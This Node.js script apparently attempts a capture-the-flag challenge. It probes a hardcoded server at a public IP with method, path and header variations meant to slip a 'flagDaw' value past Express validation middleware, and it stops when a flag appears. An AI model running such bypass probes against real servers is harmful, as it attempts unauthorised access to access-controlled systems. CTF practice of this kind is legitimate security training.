const http = require('http');

const url = new URL('http://49.213.52.6:6969/');

// Try Express middleware bypass techniques
// Maybe the validation happens in middleware and we can bypass it
const tests = [
  {
    name: 'Try OPTIONS method first then POST',
    method: 'OPTIONS',
    data: ''
  },
  {
    name: 'Try HEAD method',
    method: 'HEAD',
    data: ''
  },
  {
    name: 'Try PATCH method',
    method: 'PATCH',
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'Try PUT method',
    method: 'PUT',
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'POST to /flag endpoint',
    path: '/flag',
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'POST to /api endpoint',
    path: '/api',
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'POST with flagDaw in path',
    path: '/?flagDaw=true',
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'POST with flagDaw in path only',
    path: '/?flagDaw=true',
    data: '{}'
  },
  {
    name: 'POST with flagDaw in headers',
    headers: { 'X-FlagDaw': 'true' },
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'POST with flagDaw only in headers',
    headers: { 'X-FlagDaw': 'true', 'flagDaw': 'true' },
    data: '{}'
  },
  {
    name: 'POST with Accept header that might change parsing',
    headers: { 
      'Content-Type': 'text/plain;charset=UTF-8',
      'Accept': 'application/json'
    },
    data: JSON.stringify({ flagDaw: true })
  },
  {
    name: 'POST with X-Content-Type-Options',
    headers: { 
      'Content-Type': 'text/plain;charset=UTF-8',
      'X-Content-Type-Options': 'nosniff'
    },
    data: JSON.stringify({ flagDaw: true })
  }
];

async function testRequest(test) {
  return new Promise((resolve) => {
    const defaultHeaders = {
      'Referer': 'http://49.213.52.6:6969/',
      'Origin': 'http://49.213.52.6:6969/',
      'Accept': '*/*'
    };
    
    if (test.data) {
      defaultHeaders['Content-Length'] = Buffer.byteLength(test.data);
    }
    
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: test.path || url.pathname,
      method: test.method || 'POST',
      headers: {
        ...defaultHeaders,
        ...(test.headers || (test.data ? { 'Content-Type': 'text/plain;charset=UTF-8' } : {}))
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        resolve({ 
          name: test.name, 
          status: res.statusCode, 
          response: responseData,
          headers: res.headers
        });
      });
    });

    req.on('error', (e) => {
      resolve({ name: test.name, error: e.message });
    });

    if (test.data) {
      req.write(test.data);
    }
    req.end();
  });
}

(async () => {
  console.log('Testing Express.js middleware bypasses...\n');
  
  for (const test of tests) {
    const result = await testRequest(test);
    console.log(`\n${test.name}:`);
    console.log(`  Status: ${result.status || 'Error'}`);
    const response = (result.response || result.error || '').substring(0, 150);
    console.log(`  Response: ${response}${(result.response || '').length > 150 ? '...' : ''}`);
    
    if (result.response && result.response.includes('CS{')) {
      console.log('\n*** FLAG FOUND ***');
      console.log('FLAG:', result.response);
      break;
    }
    
    await new Promise(r => setTimeout(r, 300));
  }
})();

